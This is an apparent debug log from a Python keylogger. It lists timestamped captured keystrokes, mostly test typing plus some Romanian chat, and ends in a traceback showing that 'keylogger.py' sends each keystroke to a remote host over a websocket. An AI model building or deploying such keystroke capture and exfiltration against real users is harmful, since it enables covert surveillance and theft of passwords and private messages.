2020-05-30 17:02:16,911: 'a':
2020-05-30 17:02:17,006: 's':
2020-05-30 17:02:17,007: 'h':
2020-05-30 17:02:17,147: 'k':
2020-05-30 17:02:17,166: 'f':
2020-05-30 17:02:17,182: 'l':
2020-05-30 17:02:17,222: 'j':
2020-05-30 17:02:17,294: 'a':
2020-05-30 17:02:17,302: 'h':
2020-05-30 17:02:17,343: 's':
2020-05-30 17:02:17,462: 'j':
2020-05-30 17:02:17,478: 'k':
2020-05-30 17:02:17,558: 'h':
2020-05-30 17:02:17,726: 'j':
2020-05-30 17:02:18,036: '7':
2020-05-30 17:02:18,054: 'f':
2020-05-30 17:02:18,055: 'u':
2020-05-30 17:02:18,294: 'i':
2020-05-30 17:02:18,343: 'u':
2020-05-30 17:02:18,422: 'a':
2020-05-30 17:02:18,423: 's':
2020-05-30 17:02:18,462: 'g':
2020-05-30 17:02:18,614: 'f':
2020-05-30 17:02:18,614: 'i':
2020-05-30 17:02:18,630: 'u':
2020-05-30 17:02:18,768: 'g':
2020-05-30 17:02:19,228: '9':
2020-05-30 17:02:19,278: '8':
2020-05-30 17:02:19,295: '7':
2020-05-30 17:02:19,318: '2':
2020-05-30 17:02:19,343: '1':
2020-05-30 17:02:19,414: '6':
2020-05-30 17:02:19,479: '3':
2020-05-30 17:02:19,550: '8':
2020-05-30 17:02:19,582: '9':
2020-05-30 17:02:19,622: '1':
2020-05-30 17:02:19,670: '2':
2020-05-30 17:02:19,846: '8':
2020-05-30 17:02:19,942: 'y':
2020-05-30 17:02:20,144: 'u':
2020-05-30 17:02:20,302: 'h':
2020-05-30 17:02:20,514: 'j':
2020-05-30 17:02:20,566: 'd':
2020-05-30 17:02:20,590: 's':
2020-05-30 17:02:20,630: 'h':
2020-05-30 17:02:20,710: 'f':
2020-05-30 17:02:20,830: 'k':
2020-05-30 17:02:20,854: 'j':
2020-05-30 17:02:20,870: 's':
2020-05-30 17:02:20,902: 'd':
2020-05-30 17:02:20,950: 'h':
2020-05-30 17:02:21,038: 'f':
2020-05-30 17:02:21,158: 's':
2020-05-30 17:02:21,206: 'd':
2020-05-30 17:02:21,334: 'f':
2020-05-30 17:02:21,454: 's':
2020-05-30 17:02:21,495: 'd':
2020-05-30 17:02:21,607: 'f':
2020-05-30 17:02:21,734: 's':
2020-05-30 17:02:21,782: 'd':
2020-05-30 17:02:21,878: 'k':
2020-05-30 17:02:21,902: 'l':
2020-05-30 17:02:21,903: 'j':
2020-05-30 17:02:21,958: 'h':
2020-05-30 17:02:22,150: 'k':
2020-05-30 17:02:22,174: 'j':
2020-05-30 17:02:22,246: 'h':
2020-05-30 17:02:22,358: 'l':
2020-05-30 17:02:22,431: 'k':
2020-05-30 17:02:22,431: 'j':
2020-05-30 17:02:22,478: 'h':
2020-05-30 17:02:22,622: 'l':
2020-05-30 17:02:22,646: 'k':
2020-05-30 17:02:22,647: 'j':
2020-05-30 17:02:22,718: 'h':
2020-05-30 17:02:23,024: 'y':
2020-05-30 17:02:23,115: 'i':
2020-05-30 17:02:23,115: 'u':
2020-05-30 17:02:23,143: 'o':
2020-05-30 17:02:23,174: 'y':
2020-05-30 17:02:23,334: 'i':
2020-05-30 17:02:23,358: 'u':
2020-05-30 17:02:23,438: 'y':
2020-05-30 17:02:23,575: 'i':
2020-05-30 17:02:23,598: 'u':
2020-05-30 17:02:23,678: 'y':
2020-05-30 17:02:23,798: 'i':
2020-05-30 17:02:23,799: 'u':
2020-05-30 17:02:23,910: 'y':
2020-05-30 17:02:24,031: 'i':
2020-05-30 17:02:24,032: 'u':
2020-05-30 17:02:24,142: 'y':
2020-05-30 17:02:24,270: 'i':
2020-05-30 17:02:24,286: 'u':
2020-05-30 17:02:24,391: 'y':
2020-05-30 17:02:24,467: 'u':
2020-05-30 17:02:24,511: 'i':
2020-05-30 17:02:24,599: 'y':
2020-05-30 17:02:24,751: 'i':
2020-05-30 17:02:24,774: 'u':
2020-05-30 17:02:24,894: 'y':
2020-05-30 17:02:24,990: 'u':
2020-05-30 17:02:25,495: 'u':
2020-05-30 17:02:25,523: 'u':
2020-05-30 17:02:25,556: 'u':
2020-05-30 17:02:25,589: 'u':
2020-05-30 17:02:25,622: 'u':
2020-05-30 17:02:25,655: 'u':
2020-05-30 17:02:25,688: 'u':
2020-05-30 17:02:25,721: 'u':
2020-05-30 17:02:25,754: 'u':
2020-05-30 17:02:25,787: 'u':
2020-05-30 17:02:25,820: 'u':
2020-05-30 17:02:25,853: 'u':
2020-05-30 17:02:25,886: 'u':
2020-05-30 17:02:25,919: 'u':
2020-05-30 17:02:25,951: 'u':
2020-05-30 17:02:25,984: 'u':
2020-05-30 17:02:26,018: 'u':
2020-05-30 17:02:26,051: 'u':
2020-05-30 17:02:26,084: 'u':
2020-05-30 17:02:26,349: 'u':
2020-05-30 17:02:26,518: 'u':
2020-05-30 17:02:26,662: 'u':
2020-05-30 17:02:26,806: 'u':
2020-05-30 17:02:26,935: 'u':
2020-05-30 17:02:27,116: 'u':
2020-05-30 17:02:27,238: 'u':
2020-05-30 17:02:27,384: 'u':
2020-05-30 17:02:27,567: 'u':
2020-05-30 17:02:27,726: 'u':
2020-05-30 17:02:27,822: 'u':
2020-05-30 17:02:28,360: 'n':
2020-05-30 17:02:28,398: 'm':
2020-05-30 17:02:28,462: 'b':
2020-05-30 17:02:28,635: ',':
2020-05-30 17:02:28,750: 'n':
2020-05-30 17:02:28,767: 'c':
2020-05-30 17:02:28,774: 'x':
2020-05-30 17:02:28,815: 'b':
2020-05-30 17:02:28,838: 'v':
2020-05-30 17:02:28,966: 'x':
2020-05-30 17:02:28,990: 'n':
2020-05-30 17:02:29,038: 'c':
2020-05-30 17:02:29,062: 'b':
2020-05-30 17:02:29,136: 'v':
2020-05-30 17:02:29,335: 'u':
2020-05-30 17:02:29,374: 'i':
2020-05-30 17:02:29,551: 'e':
2020-05-30 17:02:29,566: 'd':
2020-05-30 17:02:29,655: 'i':
2020-05-30 17:02:29,758: 'q':
2020-05-30 17:02:29,759: 't':
2020-05-30 17:02:29,968: '7':
2020-05-30 17:02:29,990: 't':
2020-05-30 17:02:30,038: 'f':
2020-05-30 17:02:30,251: 't':
2020-05-30 17:02:30,310: 'f':
2020-05-30 17:02:30,468: 's':
2020-05-30 17:02:30,542: 'd':
2020-05-30 17:02:30,550: 't':
2020-05-30 17:02:30,718: '7':
2020-05-30 17:02:30,902: '6':
2020-05-30 17:02:31,002: '4':
2020-05-30 17:02:31,046: '8':
2020-05-30 17:02:31,047: '9':
2020-05-30 17:02:31,158: '2':
2020-05-30 17:02:31,159: '1':
2020-05-30 17:02:31,160: '6':
2020-05-30 17:02:31,247: '9':
2020-05-30 17:02:31,294: '4':
2020-05-30 17:02:31,318: '8':
2020-05-30 17:02:31,391: '6':
2020-05-30 17:02:31,486: '9':
2020-05-30 17:02:31,534: '4':
2020-05-30 17:02:31,574: '8':
2020-05-30 17:02:31,630: '6':
2020-05-30 17:02:31,695: '1':
2020-05-30 17:02:31,726: '9':
2020-05-30 17:02:31,742: '2':
2020-05-30 17:02:31,766: '8':
2020-05-30 17:02:32,220: 'g':
2020-05-30 17:02:32,366: 'f':
2020-05-30 17:02:32,436: 'j':
2020-05-30 17:02:32,462: 'h':
2020-05-30 17:02:32,486: 'd':
2020-05-30 17:02:32,535: 'g':
2020-05-30 17:02:32,630: 'f':
2020-05-30 17:02:32,686: 'j':
2020-05-30 17:02:32,702: 'h':
2020-05-30 17:02:32,767: 's':
2020-05-30 17:02:32,774: 'd':
2020-05-30 17:02:32,790: 'g':
2020-05-30 17:02:32,903: 'f':
2020-05-30 17:02:32,926: 'h':
2020-05-30 17:02:32,927: 'j':
2020-05-30 17:02:33,014: 's':
2020-05-30 17:02:33,038: 'd':
2020-05-30 17:02:33,318: 'n':
2020-05-30 17:02:33,318: 'b':
2020-05-30 17:02:33,350: 'v':
2020-05-30 17:02:33,494: 'b':
2020-05-30 17:02:33,630: 'v':
2020-05-30 17:02:33,726: 'n':
2020-05-30 17:02:33,727: 'b':
2020-05-30 17:02:33,837: 'v':
2020-05-30 17:02:33,934: 'b':
2020-05-30 17:02:33,943: 'n':
2020-05-30 17:02:34,030: 'v':
2020-05-30 17:02:34,150: 'b':
2020-05-30 17:02:34,158: 'n':
2020-05-30 17:02:34,255: 'v':
2020-05-30 17:02:34,367: 'b':
2020-05-30 17:02:34,374: 'n':
2020-05-30 17:02:34,486: 'v':
2020-05-30 17:02:34,604: 'b':
2020-05-30 17:02:34,721: 'v':
2020-05-30 17:02:34,894: 'n':
2020-05-30 17:02:34,895: 'b':
2020-05-30 17:02:36,110: 'b':
2020-05-30 17:02:36,263: 'm':
2020-05-30 17:02:36,294: 'n':
2020-05-30 17:02:36,382: 'b':
2020-05-30 17:02:36,534: 'm':
2020-05-30 17:02:36,550: 'n':
2020-05-30 17:02:36,630: 'b':
2020-05-30 17:02:36,774: 'm':
2020-05-30 17:02:36,775: 'n':
2020-05-30 17:02:36,886: 'b':
2020-05-30 17:02:37,054: 'f':
2020-05-30 17:02:37,205: 's':
2020-05-30 17:02:37,205: 'o':
2020-05-30 17:02:37,230: 'i':
2020-05-30 17:02:37,278: 'd':
2020-05-30 17:02:37,391: 'f':
2020-05-30 17:02:37,518: 's':
2020-05-30 17:02:37,582: 'd':
2020-05-30 17:02:40,789: ';':
2020-05-30 17:02:40,870: 'l':
2020-05-30 17:02:40,990: "'":
2020-05-30 17:02:41,062: ';':
2020-05-30 17:02:41,134: 'l':
2020-05-30 17:02:41,254: "'":
2020-05-30 17:02:41,294: ';':
2020-05-30 17:02:41,390: 'l':
2020-05-30 17:02:41,491: "'":
2020-05-30 17:02:41,542: ';':
2020-05-30 17:02:41,630: 'l':
2020-05-30 17:02:41,758: "'":
2020-05-30 17:02:41,806: ';':
2020-05-30 17:02:41,870: 'l':
2020-05-30 17:02:42,014: ';':
2020-05-30 17:02:42,038: "'":
2020-05-30 17:02:42,143: 'l':
2020-05-30 17:02:42,464: 'o':
2020-05-30 17:02:42,502: 'f':
2020-05-30 17:02:42,647: 'o':
2020-05-30 17:02:42,663: 's':
2020-05-30 17:02:42,663: 'd':
2020-05-30 17:02:42,839: 'f':
2020-05-30 17:02:42,982: 's':
2020-05-30 17:02:42,983: 'i':
2020-05-30 17:02:43,023: 'd':
2020-05-30 17:02:43,047: 'j':
2020-05-30 17:02:43,214: 'i':
2020-05-30 17:02:43,343: 'g':
2020-05-30 17:02:44,196: 'k':
2020-05-30 17:02:44,196: 'j':
2020-05-30 17:02:44,325: 'h':
2020-05-30 17:02:44,470: 'j':
2020-05-30 17:02:44,566: 'h':
2020-05-30 17:02:44,695: 'k':
2020-05-30 17:02:44,696: 'j':
2020-05-30 17:02:44,798: 'h':
2020-05-30 17:02:44,934: 'k':
2020-05-30 17:02:44,935: 'j':
2020-05-30 17:02:45,038: 'h':
2020-05-30 17:02:45,159: 'k':
2020-05-30 17:02:45,182: 'j':
2020-05-30 17:02:45,295: 'h':
2020-05-30 17:02:45,442: 'k':
2020-05-30 17:02:45,442: 'j':
2020-05-30 17:02:45,786: 'k':
2020-05-30 17:02:45,786: 'j':
2020-05-30 17:02:45,926: 'f':
2020-05-30 17:02:46,014: 'k':
2020-05-30 17:02:46,015: 'l':
2020-05-30 17:02:46,062: 's':
2020-05-30 17:02:46,110: 'd':
2020-05-30 17:02:46,111: 'j':
2020-05-30 17:02:46,323: 'f':
2020-05-30 17:02:46,438: 'o':
2020-05-30 17:02:46,439: 'i':
2020-05-30 17:02:46,543: 's':
2020-05-30 17:02:46,582: 'd':
2020-05-30 17:02:46,726: 'f':
2020-05-30 17:02:47,251: '-':
2020-05-30 17:02:47,414: '1':
2020-05-30 17:02:47,462: '2':
2020-05-30 17:02:47,518: '3':
2020-05-30 17:02:47,675: '1':
2020-05-30 17:02:47,727: '2':
2020-05-30 17:02:47,807: '3':
2020-05-30 17:02:47,950: '1':
2020-05-30 17:02:47,994: '2':
2020-05-30 17:02:48,087: '3':
2020-05-30 17:02:48,241: '1':
2020-05-30 17:02:48,287: '2':
2020-05-30 17:02:48,382: '3':
2020-05-30 17:02:48,907: ',':
2020-05-30 17:02:48,907: 'm':
2020-05-30 17:02:48,958: 'n':
2020-05-30 17:02:49,159: 'm':
2020-05-30 17:02:49,190: 'x':
2020-05-30 17:02:49,246: 'c':
2020-05-30 17:02:49,247: 'n':
2020-05-30 17:02:49,382: 'v':
2020-05-30 17:02:49,390: ',':
2020-05-30 17:02:49,414: 'm':
2020-05-30 17:02:49,464: 'x':
2020-05-30 17:02:49,478: 'n':
2020-05-30 17:02:49,534: 'c':
2020-05-30 17:02:49,630: 'm':
2020-05-30 17:02:49,654: ',':
2020-05-30 17:02:49,655: 'v':
2020-05-30 17:02:49,679: 'n':
2020-05-30 17:02:49,838: 'x':
2020-05-30 17:02:49,862: 'c':
2020-05-30 17:02:49,887: 'm':
2020-05-30 17:02:49,958: 'n':
2020-05-30 17:02:50,611: 'd':
2020-05-30 17:02:50,638: 's':
2020-05-30 17:02:50,654: 'k':
2020-05-30 17:02:50,679: 'f':
2020-05-30 17:02:50,702: 'j':
2020-05-30 17:02:50,815: 's':
2020-05-30 17:02:50,822: 'l':
2020-05-30 17:02:50,879: 'd':
2020-05-30 17:02:50,895: 'k':
2020-05-30 17:02:50,943: 'j':
2020-05-30 17:02:50,968: 'f':
2020-05-30 17:02:51,086: 'l':
2020-05-30 17:02:51,102: 's':
2020-05-30 17:02:51,126: 'k':
2020-05-30 17:02:51,151: 'd':
2020-05-30 17:02:51,247: 'f':
2020-05-30 17:02:51,366: 's':
2020-05-30 17:02:51,390: 'k':
2020-05-30 17:02:51,415: 'd':
2020-05-30 17:02:51,416: 'l':
2020-05-30 17:02:51,502: 'f':
2020-05-30 17:02:51,638: 's':
2020-05-30 17:02:51,726: 'k':
2020-05-30 17:02:51,727: 'd':
2020-05-30 17:02:51,728: 'l':
2020-05-30 17:02:51,750: 'f':
2020-05-30 17:02:53,069: 'o':
2020-05-30 17:02:53,134: 'i':
2020-05-30 17:02:53,206: 'j':
2020-05-30 17:02:53,335: 'o':
2020-05-30 17:02:53,336: 'i':
2020-05-30 17:02:53,447: 'j':
2020-05-30 17:02:53,543: 'o':
2020-05-30 17:02:53,566: 'i':
2020-05-30 17:02:57,871: 'b':
2020-05-30 17:02:57,974: 'a':
2020-05-30 17:02:58,094: 'i':
2020-05-30 17:02:58,311: Key.space:
2020-05-30 17:02:58,643: 'g':
2020-05-30 17:02:58,719: 'i':
2020-05-30 17:02:58,822: 'g':
2020-05-30 17:02:58,958: 'e':
2020-05-30 17:02:59,039: 'l':
2020-05-30 17:02:59,276: '\\':
2020-05-30 17:02:59,286: Key.enter:
2020-05-30 17:03:00,366: 'n':
2020-05-30 17:03:00,454: 'u':
2020-05-30 17:03:00,525: Key.space:
2020-05-30 17:03:00,599: 'v':
2020-05-30 17:03:00,831: 'r':
2020-05-30 17:03:00,886: 'e':
2020-05-30 17:03:00,991: 'i':
2020-05-30 17:03:01,110: Key.space:
2020-05-30 17:03:01,311: 's':
2020-05-30 17:03:01,390: 'a':
2020-05-30 17:03:01,487: Key.space:
2020-05-30 17:03:01,630: 'i':
2020-05-30 17:03:01,710: 'e':
2020-05-30 17:03:01,917: 's':
2020-05-30 17:03:02,014: 'i':
2020-05-30 17:03:02,249: 'm':
2020-05-30 17:03:02,398: Key.space:
2020-05-30 17:03:02,542: 'p':
2020-05-30 17:03:02,859: 'u':
2020-05-30 17:03:02,950: 't':
2020-05-30 17:03:03,068: 'i':
2020-05-30 17:03:03,167: 'n':
2020-05-30 17:03:03,279: Key.space:
2020-05-30 17:03:03,478: 'p':
2020-05-30 17:03:03,550: 'e':
2020-05-30 17:03:03,694: Key.space:
2020-05-30 17:03:03,814: 'a':
2020-05-30 17:03:04,022: 'f':
2020-05-30 17:03:04,206: 'a':
2020-05-30 17:03:04,311: 'r':
2020-05-30 17:03:04,406: 'a':
2020-05-30 17:03:05,988: ',':
2020-05-30 17:03:06,218: Key.space:
2020-05-30 17:03:07,178: 'p':
2020-05-30 17:03:07,262: 'e':
2020-05-30 17:03:07,485: 's':
2020-05-30 17:03:07,732: 't':
2020-05-30 17:03:07,853: 'e':
2020-05-30 17:03:08,656: Key.backspace:
2020-05-30 17:03:08,702: Key.ctrl_l:
2020-05-30 17:03:08,719: Key.backspace:
2020-05-30 17:03:08,838: Key.backspace:
2020-05-30 17:03:10,377: 'a':
2020-05-30 17:03:10,487: 'f':
2020-05-30 17:03:10,780: 'a':
2020-05-30 17:03:10,798: 'r':
2020-05-30 17:03:11,732: 'a':
2020-05-30 17:03:11,910: ',':
2020-05-30 17:03:12,102: Key.space:
2020-05-30 17:03:12,286: 'o':
2020-05-30 17:03:12,430: Key.space:
2020-05-30 17:03:12,574: 'o':
2020-05-30 17:03:12,695: 'r':
2020-05-30 17:03:12,750: 'a':
2020-05-30 17:03:12,903: Key.space:
2020-05-30 17:03:13,054: 'a':
2020-05-30 17:03:13,155: 's':
2020-05-30 17:03:14,305: Key.ctrl_l:
2020-05-30 17:03:14,479: Key.left:
2020-05-30 17:03:14,858: Key.left:
2020-05-30 17:03:15,486: Key.space:
2020-05-30 17:03:15,630: '-':
2020-05-30 17:03:15,702: Key.space:
2020-05-30 17:03:15,870: 'd':
2020-05-30 17:03:15,990: 'o':
2020-05-30 17:03:16,207: 'u':
2020-05-30 17:03:16,326: 'a':
2020-05-30 17:03:16,744: Key.space:
2020-05-30 17:03:17,034: Key.right:
2020-05-30 17:03:17,269: Key.right:
2020-05-30 17:03:17,422: Key.ctrl_l:
2020-05-30 17:03:17,438: Key.shift:
2020-05-30 17:03:17,534: Key.left:
2020-05-30 17:03:18,003: Key.left:
2020-05-30 17:03:18,271: Key.left:
2020-05-30 17:03:18,454: Key.left:
2020-05-30 17:03:18,590: Key.shift:
2020-05-30 17:03:18,598: Key.ctrl_l:
2020-05-30 17:03:18,686: Key.right:
2020-05-30 17:03:18,874: Key.right:
2020-05-30 17:03:19,449: Key.backspace:
2020-05-30 17:03:19,528: Key.backspace:
2020-05-30 17:03:19,622: Key.space:
2020-05-30 17:03:19,774: Key.shift_r:
2020-05-30 17:03:19,846: '?':
2020-05-30 17:03:19,982: Key.space:
2020-05-30 17:03:20,134: Key.shift_r:
2020-05-30 17:03:20,198: ':':
2020-05-30 17:03:20,434: ')':
2020-05-30 17:03:20,590: ')':
2020-05-30 17:03:20,916: Key.enter:
2020-05-30 17:03:24,303: 'c':
2020-05-30 17:03:24,374: 'a':
2020-05-30 17:03:24,486: Key.space:
2020-05-30 17:03:24,582: 'a':
2020-05-30 17:03:24,643: 'c':
2020-05-30 17:03:24,750: 'u':
2020-05-30 17:03:24,805: Key.space:
2020-05-30 17:03:24,998: 's':
2020-05-30 17:03:25,193: 't':
2020-05-30 17:03:25,311: 'a':
2020-05-30 17:03:25,454: 'i':
2020-05-30 17:03:25,494: Key.space:
2020-05-30 17:03:26,188: 'a':
2020-05-30 17:03:26,310: 'p':
2020-05-30 17:03:26,454: 'r':
2020-05-30 17:03:26,527: 'o':
2020-05-30 17:03:26,606: 'a':
2020-05-30 17:03:26,726: 'p':
2020-05-30 17:03:26,827: 'e':
2020-05-30 17:03:27,091: Key.enter:
2020-05-30 17:03:48,700: 's':
2020-05-30 17:03:48,863: 'i':
2020-05-30 17:03:48,990: Key.space:
2020-05-30 17:03:49,185: 'm':
2020-05-30 17:03:49,206: 'i':
2020-05-30 17:03:49,321: 'i':
2020-05-30 17:03:49,741: Key.backspace:
2020-05-30 17:03:49,831: Key.backspace:
2020-05-30 17:03:49,918: Key.backspace:
2020-05-30 17:03:49,990: Key.backspace:
2020-05-30 17:03:50,045: Key.backspace:
2020-05-30 17:03:50,106: Key.backspace:
2020-05-30 17:03:50,387: 'i':
2020-05-30 17:03:50,518: 'm':
2020-05-30 17:03:50,662: 'i':
2020-05-30 17:03:50,766: Key.space:
2020-05-30 17:03:50,902: 's':
2020-05-30 17:03:50,950: 'i':
2020-05-30 17:03:51,071: Key.space:
2020-05-30 17:03:51,198: 'z':
2020-05-30 17:03:51,270: 'i':
2020-05-30 17:03:51,406: 'c':
2020-05-30 17:03:51,486: 'i':
2020-05-30 17:03:51,646: Key.space:
2020-05-30 17:03:51,766: 'c':
2020-05-30 17:03:51,822: 'e':
2020-05-30 17:03:51,958: Key.space:
2020-05-30 17:03:52,062: 'v':
2020-05-30 17:03:52,256: 'r':
2020-05-30 17:03:52,351: 'e':
2020-05-30 17:03:52,390: 'i':
2020-05-30 17:03:52,518: Key.space:
2020-05-30 17:03:52,638: 's':
2020-05-30 17:03:52,678: 'a':
2020-05-30 17:03:52,855: '-':
2020-05-30 17:03:52,991: 't':
2020-05-30 17:03:53,182: 'i':
2020-05-30 17:03:53,302: Key.space:
2020-05-30 17:03:53,470: 'f':
2020-05-30 17:03:53,550: 'a':
2020-05-30 17:03:53,734: 'c':
2020-05-30 17:03:53,862: Key.space:
2020-05-30 17:03:54,006: 'l':
2020-05-30 17:03:54,070: 'a':
2020-05-30 17:03:54,214: Key.space:
2020-05-30 17:03:54,406: 'a':
2020-05-30 17:03:54,526: 'l':
2020-05-30 17:03:54,623: 'a':
2020-05-30 17:03:54,857: Key.space:
2020-05-30 17:03:54,958: Key.shift_r:
2020-05-30 17:03:55,106: ':':
2020-05-30 17:03:55,369: ')':
2020-05-30 17:03:55,542: ')':
2020-05-30 17:03:55,977: Key.enter:
2020-05-30 17:05:53,421: '=':
2020-05-30 17:05:53,528: Key.shift_r:
2020-05-30 17:05:53,718: ')':
2020-05-30 17:05:53,878: ')':
2020-05-30 17:05:54,454: Key.enter:
2020-05-30 17:06:11,663: 'b':
2020-05-30 17:06:11,878: 'i':
2020-05-30 17:06:11,985: 'n':
2020-05-30 17:06:13,168: 'i':
2020-05-30 17:06:13,545: Key.enter:
2020-05-30 17:06:26,999: Key.ctrl_l:
2020-05-30 17:06:27,107: '\x03':
2020-05-30 17:06:28,118: Key.ctrl_l:
2020-05-30 17:06:28,118: Unhandled exception in listener callback:
Traceback (most recent call last):
  File "C:\Users\ionut\AppData\Local\Programs\Python\Python38-32\lib\site-packages\pynput\_util\__init__.py", line 162, in inner
    return f(self, *args, **kwargs)
  File "C:\Users\ionut\AppData\Local\Programs\Python\Python38-32\lib\site-packages\pynput\keyboard\_win32.py", line 280, in _process
    self.on_press(key)
  File "C:\Users\ionut\AppData\Local\Programs\Python\Python38-32\lib\site-packages\pynput\_util\__init__.py", line 78, in inner
    if f(*args) is False:
  File "keylogger.py", line 33, in on_press
    ws.send('{"timestamp": "' + str(datetime.now()) +
  File "C:\Users\ionut\AppData\Local\Programs\Python\Python38-32\lib\site-packages\websocket\_core.py", line 253, in send
    return self.send_frame(frame)
  File "C:\Users\ionut\AppData\Local\Programs\Python\Python38-32\lib\site-packages\websocket\_core.py", line 279, in send_frame
    l = self._send(data)
  File "C:\Users\ionut\AppData\Local\Programs\Python\Python38-32\lib\site-packages\websocket\_core.py", line 449, in _send
    return send(self.sock, data)
  File "C:\Users\ionut\AppData\Local\Programs\Python\Python38-32\lib\site-packages\websocket\_socket.py", line 157, in send
    return _send()
  File "C:\Users\ionut\AppData\Local\Programs\Python\Python38-32\lib\site-packages\websocket\_socket.py", line 139, in _send
    return sock.send(data)
ConnectionResetError: [WinError 10054] An existing connection was forcibly closed by the remote host
